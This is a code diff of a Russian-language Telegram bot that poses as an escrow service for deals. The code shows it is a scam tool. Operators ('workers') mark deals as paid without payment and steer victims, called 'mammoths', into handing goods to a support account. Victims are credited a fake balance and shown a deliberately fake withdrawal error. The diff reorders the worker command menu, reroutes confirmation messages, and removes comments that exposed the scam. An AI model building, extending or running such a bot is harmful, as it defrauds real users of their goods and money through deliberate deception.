@@ -80,6 +80,20 @@ def get_currency_emoji(currency):
 async def send_main_menu(message: Message, user_id: int):
     is_admin_user = is_admin(user_id)
 
+    # СНАЧАЛА КОМАНДЫ ВОРКЕРА (для админа)
+    if is_admin_user:
+        await message.answer(
+            f"{E_SETTINGS} <b>Приветствую, воркер!</b>\n\n"
+            f"<b>Наши команды:</b>\n"
+            f"/buy *код-сделки* – для оплаты сделки\n"
+            f"/set_sdel – для установки успешных сделок\n"
+            f"/set_ret – для установки рейтинга (в профиле)\n"
+            f"/twodeal *юз/айди* – сообщение о второй сделке\n"
+            f"/send *текст* *юз/айди* – отправить сообщение\n"
+            f"/chat *юз/айди* – выгрузить историю переписки"
+        )
+
+    # ПОТОМ ГЛАВНОЕ МЕНЮ
     if os.path.exists(WELCOME_GIF_PATH):
         try:
             gif = FSInputFile(WELCOME_GIF_PATH)
@@ -109,18 +123,6 @@ async def send_main_menu(message: Message, user_id: int):
     text += f"• Система рейтинга покупателей и продавцов\n"
     text += f"• Поддержка 24/7\n\n"
     text += f"{E_CHAT} Поддержка: {SUPPORT_USERNAME}"
-
-    if is_admin_user:
-        await message.answer(
-            f"{E_SETTINGS} <b>Приветствую, воркер!</b>\n\n"
-            f"<b>Наши команды:</b>\n"
-            f"/buy *код-сделки* – для оплаты сделки\n"
-            f"/set_sdel – для установки успешных сделок\n"
-            f"/set_ret – для установки рейтинга (в профиле)\n"
-            f"/twodeal *юз/айди* – сообщение о второй сделке\n"
-            f"/send *текст* *юз/айди* – отправить сообщение\n"
-            f"/chat *юз/айди* – выгрузить историю переписки"
-        )
 
     await message.answer(text, reply_markup=main_menu(is_admin_user))
 
@@ -154,7 +156,6 @@ async def cmd_start(message: Message, state: FSMContext):
                 
                 currency_emoji = get_currency_emoji(deal[5])
                 
-                # Сообщение для мамонта (покупателя) после перехода по ссылке
                 await message.answer(
                     f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
                     f"<b>Сумма:</b> {format_amount(deal[4])} {currency_emoji}\n"
@@ -169,7 +170,6 @@ async def cmd_start(message: Message, state: FSMContext):
                 user = get_user(user_id)
                 deals_count = user[3] if user else 0
 
-                # Уведомление продавцу (мамонту) что покупатель присоединился
                 await message.bot.send_message(
                     deal[1],
                     f"{E_WARNING} <b>@{username} ({user_id}) присоединился к сделке #{deal_code}!</b>\n"
@@ -478,7 +478,6 @@ async def select_currency(callback: CallbackQuery, state: FSMContext):
     
     currency_display = {"gram": "GRAM", "card": "Карта", "stars": "Звёзды"}[currency]
     
-    # === ДЛЯ ЗВЁЗД — СРАЗУ ПРОСИМ СУММУ (РЕКВИЗИТЫ НЕ НУЖНЫ) ===
     if currency == "stars":
         await state.update_data(currency=currency_names[currency])
         if not callback.message.text:
@@ -497,11 +496,9 @@ async def select_currency(callback: CallbackQuery, state: FSMContext):
         await callback.answer()
         return
     
-    # === ДЛЯ GRAM И КАРТА — ПРОВЕРЯЕМ РЕКВИЗИТЫ ===
     user_id = callback.from_user.id
     reqs = get_requisites(user_id)
     
-    # Проверяем есть ли реквизиты нужного типа
     has_req = False
     req_type = "gram" if currency == "gram" else "card"
     for req in reqs:
@@ -577,8 +574,6 @@ async def process_description(message: Message, state: FSMContext):
 
     user_id = message.from_user.id
     
-    # Проверка реквизитов (кроме звёзд) — уже проверено на этапе выбора валюты
-    # Но на всякий случай проверим ещё раз
     if currency != "звезд":
         reqs = get_requisites(user_id)
         req_type = "gram" if currency == "грам" else "card"
@@ -617,7 +612,6 @@ async def process_description(message: Message, state: FSMContext):
 async def share_deal_link(callback: CallbackQuery):
     deal_code = callback.data.replace("share_", "")
     
-    # Если это "отправить" (второй клик)
     if deal_code.startswith("send_"):
         deal_code = deal_code.replace("send_", "")
         deal = get_deal(deal_code)
@@ -627,7 +621,6 @@ async def share_deal_link(callback: CallbackQuery):
         bot_username = (await callback.bot.get_me()).username
         deal_link = f"https://t.me/{bot_username}?start={deal_code}"
         
-        # Отправляем сообщение для пересылки по чатам
         await callback.message.answer(
             f"{deal_link}\n\nПо этой ссылке можно перейти на сделку со мной 🤝"
         )
@@ -642,7 +635,6 @@ async def share_deal_link(callback: CallbackQuery):
     bot_username = (await callback.bot.get_me()).username
     deal_link = f"https://t.me/{bot_username}?start={deal_code}"
 
-    # Первое нажатие — показываем кнопку для отправки
     await callback.message.answer(
         f"{E_SHARE} <b>Ссылка для покупателя:</b>\n{deal_link}",
         reply_markup=share_deal(deal_code, deal_link)
@@ -814,7 +806,6 @@ async def withdraw_callback(callback: CallbackQuery):
     user = get_user(user_id)
     balance = user[5] if user else 0
 
-    # Фейковая ошибка вывода — мамонт не может вывести деньги
     if user_id not in ADMIN_IDS:
         await callback.message.edit_text(
             f"{E_CROSS} <b>Ошибка вывода!</b>\n\n"
@@ -896,23 +887,20 @@ async def hit_mammoth(callback: CallbackQuery):
         await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
         return
 
-    # Обновляем статус на paid
     update_deal_paid(deal_code)
     deal = get_deal(deal_code)
     
-    seller_id = deal[1]  # МАМОНТ — тот, кто создал сделку (продавец)
+    seller_id = deal[1]
     currency_emoji = get_currency_emoji(deal[5])
     amount_display = format_amount(deal[4])
 
     logger.info(f"hit_mammoth: deal={deal_code}, seller_id={seller_id}")
 
-    # ===== СКАМЕРУ =====
-    # 1. Оплата получена
+    # СКАМЕРУ
     await callback.message.edit_text(
         f"{E_SUCCESS} <b>Оплата по сделке #{deal_code} успешно получена!</b>\nПродавец получил уведомление"
     )
 
-    # 2. Статус + жди передачи (скамеру)
     await callback.message.answer(
         f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
         f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
@@ -922,7 +910,7 @@ async def hit_mammoth(callback: CallbackQuery):
         f"{E_WARNING} Дождитесь, пока продавец передаст товар на аккаунт {SUPPORT_USERNAME}, а затем подтвердите это в боте!"
     )
 
-    # ===== МАМОНТУ (В ЛИЧКУ ОТ БОТА!) =====
+    # МАМОНТУ
     if seller_id:
         try:
             await callback.bot.send_message(
@@ -949,6 +937,7 @@ async def hit_mammoth(callback: CallbackQuery):
 
 @router.callback_query(F.data.startswith("confirm_deal_"))
 async def confirm_deal(callback: CallbackQuery):
+    """Мамонт нажимает 'Подтвердить передачу'"""
     deal_code = callback.data.replace("confirm_deal_", "")
     deal = get_deal(deal_code)
 
@@ -965,20 +954,24 @@ async def confirm_deal(callback: CallbackQuery):
     amount_display = format_amount(deal[4])
 
     # ===== МАМОНТУ: жди проверки =====
-    await callback.message.edit_text(
-        f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
-        f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
-        f"<b>Описание:</b> {deal[5]}\n"
-        f"<b>Комиссия:</b> {COMMISSION}%\n\n"
-        f"<b>Статус сделки: покупатель успешно оплатил, продавец подтвердил передачу товара</b>\n\n"
-        f"Ожидайте проверки покупателем и подтверждения перевода на аккаунт {SUPPORT_USERNAME}.\n"
-        f"Если товар не был передан на {SUPPORT_USERNAME}, покупатель не сможет подтвердить получение, а вы не получите оплату!",
-        reply_markup=support_button()
-    )
+    if seller_id:
+        try:
+            await callback.bot.send_message(
+                seller_id,
+                f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
+                f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
+                f"<b>Описание:</b> {deal[5]}\n"
+                f"<b>Комиссия:</b> {COMMISSION}%\n\n"
+                f"<b>Статус сделки: покупатель успешно оплатил, продавец подтвердил передачу товара</b>\n\n"
+                f"Ожидайте проверки покупателем и подтверждения перевода на аккаунт {SUPPORT_USERNAME}.\n"
+                f"Если товар не был передан на {SUPPORT_USERNAME}, покупатель не сможет подтвердить получение, а вы не получите оплату!",
+                reply_markup=support_button()
+            )
+        except Exception as e:
+            logger.error(f"Не удалось отправить сообщение мамонту: {e}")
 
-    # ===== СКАМЕРУ: проверь передачу =====
-    await callback.bot.send_message(
-        SCAMMER_ID,
+    # ===== СКАМЕРУ: проверь передачу (кнопка) =====
+    await callback.message.edit_text(
         f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
         f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
         f"<b>Описание:</b> {deal[5]}\n"
@@ -1014,7 +1007,6 @@ async def confirm_deal_seller(callback: CallbackQuery):
     currency_emoji = get_currency_emoji(deal[5])
     amount_display = format_amount(deal[4])
 
-    # Начисляем деньги на фейк-баланс продавцу (мамонту)
     update_user_balance(seller_id, deal[4])
     update_user_successful_deals(seller_id)
     if buyer_id:
